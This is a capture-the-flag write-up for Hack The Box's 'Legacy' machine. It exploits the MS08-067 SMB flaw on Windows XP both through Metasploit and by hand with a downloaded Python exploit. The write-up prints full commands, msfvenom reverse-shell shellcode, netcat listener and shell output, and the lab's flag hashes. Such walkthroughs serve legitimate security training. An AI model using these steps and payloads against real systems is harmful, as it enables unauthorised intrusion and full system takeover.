---
title: "[HTB] Legacy"
permalink: /writeups/htb/legacy/
excerpt: "Legacy machine from Hack The Box writeup."
tags:
  - HacktheBox
  - MS08_067
  - CVE-2008-4250
  - Windows
  - WindowsXP
  - SMB
  - Metasploit
  - Pentest
  - Writeup
  - Easy
---
{% include toc icon="bookmark" title="HTB Legacy" %}
# Introduction
The Legacy box offered by HTB is arguably one of the easiest boxes available, as it takes advantage of a well-known (and still seen in the wild) SMB exploit that affected Windows XP. It serves as a great example for just how flawed modern systems can be, to the point that an actor with no training is able to gain root access within a few keystrokes.

If you're starting here then you're probably new to hacking and penetration-testing world in general. If your plan is to make a career of this, you should be aware that games like HTB exclude many important aspects of a penetration test, such as scoping or reporting. You should review something like the [Penetration Testing Execution Standard](http://www.pentest-standard.org/index.php/Main_Page).

# Reconassaince and Enumeration
The technical portion of engagements begin with reconassaince - an effort to identify what potential openings are available to explore. Additionally, in Hack the Box we're usually only going after a single machine at a time and don't need to look for targets throughout the network.

## Nmap
We can use the program `nmap` to identify which ports are open on a system. The arguments perform the following functions:
    - `A` enables version detection, OS detection, script scanning, and traceroute.
    - `10.10.10.4` is the IP address of the system, as provided by HTB.

Unless directed otherwise, nmap will perform a TCP only scan of the most common 1000 ports.

```bash
┌─(root💀dc20505)-[~/legacy]
└─# nmap -A 10.10.10.4
Starting Nmap 7.92 ( https://nmap.org ) at 2022-04-06 18:57 EDT
Nmap scan report for legacy.htb (10.10.10.4)
Host is up (0.053s latency).
Not shown: 997 filtered tcp ports (no-response)
PORT     STATE  SERVICE       VERSION
139/tcp  open   netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open   microsoft-ds  Windows XP microsoft-ds
3389/tcp closed ms-wbt-server
Device type: general purpose|specialized
Running (JUST GUESSING): Microsoft Windows XP|2003|2000|2008 (94%), General Dynamics embedded (89%)
OS CPE: cpe:/o:microsoft:windows_xp::sp3 cpe:/o:microsoft:windows_server_2003::sp1 cpe:/o:microsoft:windows_server_2003::sp2 cpe:/o:microsoft:windows_2000::sp4 cpe:/o:microsoft:windows_server_2008::sp2
Aggressive OS guesses: Microsoft Windows XP SP3 (94%), Microsoft Windows Server 2003 SP1 or SP2 (92%), Microsoft Windows XP (92%), Microsoft Windows Server 2003 SP2 (92%), Microsoft Windows 2003 SP2 (91%), Microsoft Windows 2000 SP4 (91%), Microsoft Windows XP SP2 or SP3 (91%), Microsoft Windows Server 2003 (90%), Microsoft Windows XP SP2 or Windows Server 2003 (90%), Microsoft Windows XP Professional SP3 (90%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OSs: Windows, Windows XP; CPE: cpe:/o:microsoft:windows, cpe:/o:microsoft:windows_xp

Host script results:
|_smb2-time: Protocol negotiation failed (SMB2)
|_clock-skew: mean: 5d00h43m47s, deviation: 2h07m16s, median: 4d23h13m47s
|_nbstat: NetBIOS name: LEGACY, NetBIOS user: <unknown>, NetBIOS MAC: 00:50:56:b9:ca:a7 (VMware)
| smb-security-mode: 
|   account_used: <blank>
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb-os-discovery: 
|   OS: Windows XP (Windows 2000 LAN Manager)
|   OS CPE: cpe:/o:microsoft:windows_xp::-
|   Computer name: legacy
|   NetBIOS computer name: LEGACY\x00
|   Workgroup: HTB\x00
|_  System time: 2022-04-12T04:11:38+03:00

TRACEROUTE (using port 3389/tcp)
HOP RTT      ADDRESS
1   53.14 ms 10.10.14.1
2   53.70 ms legacy.htb (10.10.10.4)

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 56.51 seconds

```
We find that Ports 139 and 445 are open, indicating that the SMB network file sharing protocol is enabled on this Windows XP machine. We may already be aware that there is a glaring security flaw with this configuration, but if not, a quick google search for `WindowsXP SMB exploit` or something similar will remedy that. 

We find advisories from [Microsoft MS08-067](https://docs.microsoft.com/en-us/security-updates/securitybulletins/2008/ms08-067) and numerous security bloggers detailing the MS08-067 vulnerability and related Common Vulnerability and Exposures/CVE listings.

# Exploitation
According to the [NIST National Vulnerability Database](https://nvd.nist.gov/vuln/detail/cve-2008-4250), CVE-2008-4250 is exploitable because:

The Server service in Microsoft Windows 2000 SP4, XP SP2 and SP3, Server 2003 SP1 and SP2, Vista Gold and SP1, Server 2008, and 7 Pre-Beta allows remote attackers to execute arbitrary code via a crafted RPC request that triggers the overflow during path canonicalization, as exploited in the wild by Gimmiv.A in October 2008, aka "Server Service Vulnerability."
{: .notice--info}
## Automatic Exploitation With Metasploit
We can use `searchsploit` to find any public exploits on the [Exploit Database](https://www.exploit-db.com/) that may be available for MS08-067. 
```bash
┌──(root💀dc20505)-[~/legacy]
└─# searchsploit ms08-067
--------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                             |  Path
--------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Microsoft Windows - 'NetAPI32.dll' Code Execution (Python) (MS08-067)                                                      | windows/remote/40279.py
Microsoft Windows Server - Code Execution (MS08-067)                                                                       | windows/remote/7104.c
Microsoft Windows Server - Code Execution (PoC) (MS08-067)                                                                 | windows/dos/6824.txt
Microsoft Windows Server - Service Relative Path Stack Corruption (MS08-067) (Metasploit)                                  | windows/remote/16362.rb
Microsoft Windows Server - Universal Code Execution (MS08-067)                                                             | windows/remote/6841.txt
Microsoft Windows Server 2000/2003 - Code Execution (MS08-067)                                                             | windows/remote/7132.py
--------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
--------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Paper Title                                                                                                               |  Path
--------------------------------------------------------------------------------------------------------------------------- ---------------------------------
How Conficker makes use of MS08-067                                                                                        | docs/english/12934-how-conficker
--------------------------------------------------------------------------------------------------------------------------- ---------------------------------

```
Many options are available, so lets run `msfconsole` to get Metasploit up and running. After that, we can again search `MS08-067` then type `use 0` to load the available exploit. We then type `options` to reveal the various configuration settings.

```bash
msf6 > search ms08-067

Matching Modules
================

   #  Name                                 Disclosure Date  Rank   Check  Description
   -  ----                                 ---------------  ----   -----  -----------
   0  exploit/windows/smb/ms08_067_netapi  2008-10-28       great  Yes    MS08-067 Microsoft Server Service Relative Path Stack Corruption


Interact with a module by name or index. For example info 0, use 0 or use exploit/windows/smb/ms08_067_netapi

msf6 > use 0
[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
msf6 exploit(windows/smb/ms08_067_netapi) > options

Module options (exploit/windows/smb/ms08_067_netapi):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   RHOSTS                    yes       The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Using-Metasploit
   RPORT    445              yes       The SMB service port (TCP)
   SMBPIPE  BROWSER          yes       The pipe name to use (BROWSER, SRVSVC)


Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     192.168.0.82     yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic Targeting
```
In this instance, we need to change `RHOST` to our remote host at 10.10.10.4, and alter the `LHOST` to the appropriate local IP. Since I'm using a VM it defaulted to the wrong address. If this address was not changed, the exploit would run but call back to the incorrect system, and thus being useless for our needs. Each of these options can be adjusted with the `set` command.

```bash
msf6 exploit(windows/smb/ms08_067_netapi) > set RHOSTS 10.10.10.4
RHOSTS => 10.10.10.4
msf6 exploit(windows/smb/ms08_067_netapi) > set LHOST 10.10.14.10
LHOST => 10.10.14.10
msf6 exploit(windows/smb/ms08_067_netapi) > options

Module options (exploit/windows/smb/ms08_067_netapi):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   RHOSTS   10.10.10.4       yes       The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Using-Metasploit
   RPORT    445              yes       The SMB service port (TCP)
   SMBPIPE  BROWSER          yes       The pipe name to use (BROWSER, SRVSVC)


Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     10.10.14.10      yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic Targeting
```
With our parameters set, we type `run` or `exploit` to begin the attack. Metasploit automatically sets up a listener on our machine at port 4444. The exploit is sent to the target, and we then wait for a response. We are greeted with a Meterpreter prompt, which allows for a lot of additional streamlined maneuvering and exploitation. The Meterpreter command `getuid` shows us who we are running as on the system, and in this case we have the highest level we can get on this machine: **NT AUTHORITY\SYSTEM**

```bash
msf6 exploit(windows/smb/ms08_067_netapi) > run

[*] Started reverse TCP handler on 10.10.14.10:4444 
[*] 10.10.10.4:445 - Automatically detecting the target...
[*] 10.10.10.4:445 - Fingerprint: Windows XP - Service Pack 3 - lang:English
[*] 10.10.10.4:445 - Selected Target: Windows XP SP3 English (AlwaysOn NX)
[*] 10.10.10.4:445 - Attempting to trigger the vulnerability...
[*] Sending stage (175174 bytes) to 10.10.10.4
[*] Meterpreter session 1 opened (10.10.14.10:4444 -> 10.10.10.4:1031 ) at 2022-04-06 19:21:52 -0400

meterpreter >getuid
Server username: NT AUTHORITY\SYSTEM

```
With this system-wide authority, the world is our oyster. We can use `cd` to change directories and identify where the user flag might be. We see one relevant user, john, and we are easily able to `cd` into his Desktop directory where we find `user.txt`.   

```bash
meterpreter > cd "C:/Documents and Settings"
meterpreter > ls
Listing: C:\Documents and Settings
==================================

Mode              Size  Type  Last modified              Name
----              ----  ----  -------------              ----
040777/rwxrwxrwx  0     dir   2017-03-16 02:07:21 -0400  Administrator
040777/rwxrwxrwx  0     dir   2017-03-16 01:29:48 -0400  All Users
040777/rwxrwxrwx  0     dir   2017-03-16 01:33:37 -0400  Default User
040777/rwxrwxrwx  0     dir   2017-03-16 01:32:52 -0400  LocalService
040777/rwxrwxrwx  0     dir   2017-03-16 01:32:43 -0400  NetworkService
040777/rwxrwxrwx  0     dir   2017-03-16 01:33:42 -0400  john

meterpreter > cd john/Desktop
meterpreter > ls
Listing: C:\Documents and Settings\john\Desktop
===============================================

Mode              Size  Type  Last modified              Name
----              ----  ----  -------------              ----
100444/r--r--r--  32    fil   2017-03-16 02:19:49 -0400  user.txt

meterpreter > cat user.txt
e69af0e4f443de7e36876fda4ec7644f

```
We don't need to do any privelege escalation, so we similarly move to the Administrator desktop to grab `root.txt`.

```bash
meterpreter > cd ../..
meterpreter > cd Administrator/Desktop
meterpreter > ls
Listing: C:\Documents and Settings\Administrator\Desktop
========================================================

Mode              Size  Type  Last modified              Name
----              ----  ----  -------------              ----
100444/r--r--r--  32    fil   2017-03-16 02:18:50 -0400  root.txt

meterpreter > cat root.txt
993442d258b0e0ec917cae9e695d5713
```
**Success!** With both of these flags we have completed Legacy!
{: .notice--success}

## Manual Exploitation
If you're interested in pursuing your [Offensive Security Certified Professional/OSCP](https://www.offensive-security.com/pwk-oscp/) certification, you need to get comfortable learning how an exploit works and tailoring it to your needs. Metasploit is amazing, but manually exploiting flaws shows the mark of a genuinely competent penetration testing professional. Additionally, newer vulnerabilities will often not yet have metasploit modules or other public exploits.

### Obtain or Construct an Exploit
We still often use the same exploits, but we set up the listener ourselves and manually modify any code specific to our situation. We have a few options, but andyacer provides and updated [python script](https://github.com/andyacer/ms08_067/blob/master/ms08_067_2018.py).

Either use `wget` commands to clone the repository or paste the code into a file via `vi` or `nano`. The code conveniently contains instructions to change variables and construct shellcode that will work. 
```bash
┌──(root💀dc20505)-[~/legacy]
└─# wget https://raw.githubusercontent.com/andyacer/ms08_067/master/ms08_067_2018.py
--2022-04-06 20:00:51--  https://raw.githubusercontent.com/andyacer/ms08_067/master/ms08_067_2018.py
Resolving raw.githubusercontent.com (raw.githubusercontent.com)... 2606:50c0:8001::154, 2606:50c0:8002::154, 2606:50c0:8003::154, ...
Connecting to raw.githubusercontent.com (raw.githubusercontent.com)|2606:50c0:8001::154|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: 12003 (12K) [text/plain]
Saving to: ‘ms08_067_2018.py’

ms08_067_2018.py                        100%[============================================================================>]  11.72K  --.-KB/s    in 0.001s  

2022-04-06 20:00:54 (10.6 MB/s) - ‘ms08_067_2018.py’ saved [12003/12003]
```
### Generate Shellcode 
The `msfvenom` program can be used with the following patrameters to generate our shellcode:
- `-p windows/shell_reverse_tcp` connects to our machine with a shell that we can catch with netcat (`nc`)
- `LHOST=10.10.14.10 LPORT=443 EXITFUNC=thread` are simply our local machine address and port we wish to receive the connection on, and how we wish for the payload to exit.
- `-b "\x00\x0a\x0d\x5c\x5f\x2f\x2e\x40"` defines the bad characters that should't be use din the code as they would cause the exploit to terminate. You often have to perform testing to discover these for yourself, but these were provided within the exploit code we selected.
- `-f py` denotes the output for the file. In this case, python. 
- `-a x86 --platform windows` describe the architecture and environment we are attacking.

```bash
┌──(root💀dc20505)-[~/legacy]
└─# msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.10 LPORT=443 EXITFUNC=thread -b "\x00\x0a\x0d\x5c\x5f\x2f\x2e\x40" -f py -a x86 --platform windows
Found 11 compatible encoders
Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
x86/shikata_ga_nai failed with A valid opcode permutation could not be found.
Attempting to encode payload with 1 iterations of generic/none
generic/none failed with Encoding failed due to a bad character (index=3, char=0x00)
Attempting to encode payload with 1 iterations of x86/call4_dword_xor
x86/call4_dword_xor succeeded with size 348 (iteration=0)
x86/call4_dword_xor chosen with final size 348
Payload size: 348 bytes
Final size of py file: 1700 bytes
buf =  b""
buf += b"\x29\xc9\x83\xe9\xaf\xe8\xff\xff\xff\xff\xc0\x5e\x81"
buf += b"\x76\x0e\x84\xf6\xc9\xb0\x83\xee\xfc\xe2\xf4\x78\x1e"
buf += b"\x4b\xb0\x84\xf6\xa9\x39\x61\xc7\x09\xd4\x0f\xa6\xf9"
buf += b"\x3b\xd6\xfa\x42\xe2\x90\x7d\xbb\x98\x8b\x41\x83\x96"
buf += b"\xb5\x09\x65\x8c\xe5\x8a\xcb\x9c\xa4\x37\x06\xbd\x85"
buf += b"\x31\x2b\x42\xd6\xa1\x42\xe2\x94\x7d\x83\x8c\x0f\xba"
buf += b"\xd8\xc8\x67\xbe\xc8\x61\xd5\x7d\x90\x90\x85\x25\x42"
buf += b"\xf9\x9c\x15\xf3\xf9\x0f\xc2\x42\xb1\x52\xc7\x36\x1c"
buf += b"\x45\x39\xc4\xb1\x43\xce\x29\xc5\x72\xf5\xb4\x48\xbf"
buf += b"\x8b\xed\xc5\x60\xae\x42\xe8\xa0\xf7\x1a\xd6\x0f\xfa"
buf += b"\x82\x3b\xdc\xea\xc8\x63\x0f\xf2\x42\xb1\x54\x7f\x8d"
buf += b"\x94\xa0\xad\x92\xd1\xdd\xac\x98\x4f\x64\xa9\x96\xea"
buf += b"\x0f\xe4\x22\x3d\xd9\x9e\xfa\x82\x84\xf6\xa1\xc7\xf7"
buf += b"\xc4\x96\xe4\xec\xba\xbe\x96\x83\x09\x1c\x08\x14\xf7"
buf += b"\xc9\xb0\xad\x32\x9d\xe0\xec\xdf\x49\xdb\x84\x09\x1c"
buf += b"\xe0\xd4\xa6\x99\xf0\xd4\xb6\x99\xd8\x6e\xf9\x16\x50"
buf += b"\x7b\x23\x5e\xda\x81\x9e\xc3\xba\x8a\xfc\xa1\xb2\x84"
buf += b"\xf7\x72\x39\x62\x9c\xd9\xe6\xd3\x9e\x50\x15\xf0\x97"
buf += b"\x36\x65\x01\x36\xbd\xbc\x7b\xb8\xc1\xc5\x68\x9e\x39"
buf += b"\x05\x26\xa0\x36\x65\xec\x95\xa4\xd4\x84\x7f\x2a\xe7"
buf += b"\xd3\xa1\xf8\x46\xee\xe4\x90\xe6\x66\x0b\xaf\x77\xc0"
buf += b"\xd2\xf5\xb1\x85\x7b\x8d\x94\x94\x30\xc9\xf4\xd0\xa6"
buf += b"\x9f\xe6\xd2\xb0\x9f\xfe\xd2\xa0\x9a\xe6\xec\x8f\x05"
buf += b"\x8f\x02\x09\x1c\x39\x64\xb8\x9f\xf6\x7b\xc6\xa1\xb8"
buf += b"\x03\xeb\xa9\x4f\x51\x4d\x29\xad\xae\xfc\xa1\x16\x11"
buf += b"\x4b\x54\x4f\x51\xca\xcf\xcc\x8e\x76\x32\x50\xf1\xf3"
buf += b"\x72\xf7\x97\x84\xa6\xda\x84\xa5\x36\x65"
```
We'll copy this shellcode into the appropriate section within our selected code. Additionally, note that the usage details for the code call on us to identify what OS we're exploiting. Before we run our exploit we'll start a netcat listener on port 443:

```bash
┌──(root💀dc20505)-[~/legacy]
└─# nc -nlvp 443
listening on [any] 443 ...
```

# Exploit
```bash
┌──(root💀dc20505)-[~/legacy]
└─# python ms08_067_2018.py 10.10.10.4 6 445
#######################################################################
#   MS08-067 Exploit
#   This is a modified verion of Debasis Mohanty's code (https://www.exploit-db.com/exploits/7132/).
#   The return addresses and the ROP parts are ported from metasploit module exploit/windows/smb/ms08_067_netapi
#
#   Mod in 2018 by Andy Acer
#   - Added support for selecting a target port at the command line.
#   - Changed library calls to allow for establishing a NetBIOS session for SMB transport
#   - Changed shellcode handling to allow for variable length shellcode.
#######################################################################

$   This version requires the Python Impacket library version to 0_9_17 or newer.
$
$   Here's how to upgrade if necessary:
$
$   git clone --branch impacket_0_9_17 --single-branch https://github.com/CoreSecurity/impacket/
$   cd impacket
$   pip install .

#######################################################################

Windows XP SP3 English (NX)

[-]Initiating connection
[-]connected to ncacn_np:10.10.10.4[\pipe\browser]
Exploit finish

```

If we check our listener we find that we have access:

```bash
┌──(root💀dc20505)-[~/legacy]
└─# nc -nlvp 443
listening on [any] 443 ...
Ncat: Connection from 10.10.10.4.
Ncat: Connection from 10.10.10.4:1028.
Microsoft Windows XP [Version 5.1.2600]
(C) Copyright 1985-2001 Microsoft Corp.

C:\WINDOWS\system32>
```
# Retrieve Flags
Again, we're NT SYSTEM/AUTHORITY and no privelege escalation is necessary. We simpyly navigate to the user and root flags.
```bash
C:\Documents and Settings\john\Desktop>type user.txt
e69af0e4f443de7e36876fda4ec7644f

C:\Documents and Settings\Administrator\Desktop>type root.txt
993442d258b0e0ec917cae9e695d5713
```

**Success!** With both of these flags we have completed Legacy!
{: .notice--success}

# Sources
- [NIST CVE-2008-4250](https://nvd.nist.gov/vuln/detail/cve-2008-4250)
- [MITRE CVE-2008-4250](https://cve.mitre.org/cgi-bin/cvename.cgi?name=cve-2008-4250)
- [Microsoft MS08-067](https://docs.microsoft.com/en-us/security-updates/securitybulletins/2008/ms08-067)
- [Andyacer's Updated Exploit](https://github.com/andyacer/ms08_067/blob/master/ms08_067_2018.py)
